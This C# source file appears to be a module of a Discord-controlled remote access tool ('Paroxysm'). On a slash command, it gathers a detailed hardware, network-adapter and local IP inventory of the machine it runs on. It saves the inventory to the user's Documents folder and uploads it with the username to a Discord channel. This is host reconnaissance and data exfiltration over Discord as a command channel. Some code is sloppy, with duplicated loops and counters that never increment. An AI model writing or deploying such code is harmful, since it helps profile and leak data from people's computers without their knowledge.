using System.Diagnostics;
using Discord;
using Discord.WebSocket;
using Paroxysm.Discord;
using Hardware.Info;
using System.Net.NetworkInformation;
using System.Linq;

namespace Paroxysm.Hooks.Actions;

public static class HardwareAction
{
    private static string FilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "hardware.txt");

    private static readonly IHardwareInfo hardwareInfo = new HardwareInfo();
    private static string GetHardwareData()
    {
        var hardwareData = new List<string>();

        hardwareInfo.RefreshAll();

        hardwareData.Add($"System Operacyjny : {hardwareInfo.OperatingSystem}");
        hardwareData.Add($"Stan Pamięci : {hardwareInfo.MemoryStatus}");
        hardwareData.Add("Lista Pamięci : ");
        int batteryListCount = 0;
        foreach (var hardware in hardwareInfo.BatteryList)
        {
            batteryListCount++;
            hardwareData.Add($@"    {batteryListCount}. {hardware}");
        }

        int biosListCount = 0;
        foreach(var hardware in hardwareInfo.BiosList)
        {
            biosListCount++;
            hardwareData.Add($@"    {biosListCount}. ${hardware}");
        }

        int driveListCount = 0;
        foreach (var drive in hardwareInfo.DriveList)
        {
            driveListCount++;
            hardwareData.Add($"{driveListCount} : {drive}");

            int partitionListCount = 0;
            int volmueListCount = 0;

            foreach (var partition in drive.PartitionList)
            {
                hardwareData.Add($@"{partitionListCount}. {partition}");

                foreach (var volume in partition.VolumeList)
                    hardwareData.Add($@"{volmueListCount}. {volume}");
            }
        }

        foreach (var hardware in hardwareInfo.KeyboardList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.MemoryList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.MonitorList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.MotherboardList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.MouseList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.NetworkAdapterList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.PrinterList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.SoundDeviceList)
            hardwareData.Add(hardware.ToString());

        foreach (var hardware in hardwareInfo.VideoControllerList)
            hardwareData.Add(hardware.ToString());

        foreach (var address in HardwareInfo.GetLocalIPv4Addresses(NetworkInterfaceType.Ethernet, OperationalStatus.Up))
            hardwareData.Add(address.ToString());

         foreach (var address in HardwareInfo.GetLocalIPv4Addresses(NetworkInterfaceType.Wireless80211))
            hardwareData.Add(address.ToString());

         foreach (var address in HardwareInfo.GetLocalIPv4Addresses(OperationalStatus.Up))
            hardwareData.Add(address.ToString());

         foreach (var address in HardwareInfo.GetLocalIPv4Addresses())
            hardwareData.Add(address.ToString());

        foreach (var address in HardwareInfo.GetLocalIPv4Addresses(NetworkInterfaceType.Wireless80211))
            hardwareData.Add(address.ToString());

        foreach (var address in HardwareInfo.GetLocalIPv4Addresses(OperationalStatus.Up))
            hardwareData.Add(address.ToString());

        foreach (var address in HardwareInfo.GetLocalIPv4Addresses())
            hardwareData.Add(address.ToString());

        return String.Join("\r\n", hardwareData.ToArray());
    }

    public static Embed Follow(SocketSlashCommand slashCommand)
    {
        slashCommand.RespondAsync("Trwa zbieranie danych..");
        string hardwareString = GetHardwareData();

        File.WriteAllText(FilePath, hardwareString);

        slashCommand.FollowupWithFileAsync(FilePath, Environment.UserName, "", null, false, true);

        return DiscordEmbed.CreateWithText(Color.Green, "Hardware Data",
            "Message with hardware info should be sent in this channel", Environment.UserName, null);
    }
}